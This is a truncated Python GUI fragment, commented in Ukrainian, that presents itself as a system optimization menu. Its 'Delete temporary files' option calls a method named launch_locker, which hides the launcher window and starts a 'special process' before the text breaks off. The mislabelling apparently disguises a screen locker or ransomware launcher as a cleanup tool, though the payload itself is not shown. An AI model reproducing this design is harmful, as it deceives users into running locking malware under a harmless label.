#!/usr/bin/env python3
"""
Меню оптимізації системи - Python інтерфейс для системних утиліт
Забезпечує зручний доступ до функцій очищення та оптимізації
"""
...
class OptimizationLauncher:
    ...
    def setup_ui(self):
        ...
        # Меню опцій
        options = [
            ("🗑️ 1. Видалити тимчасові файли", self.launch_locker, LAUNCHER_COLORS["accent"]),
    ...
    def launch_locker(self):
        """Видаляє тимчасові файли (спеціальний метод)"""
        self.root.withdraw()  # Ховаємо лаунчер
        try:
            # Запускаємо спеціальний процес очищення
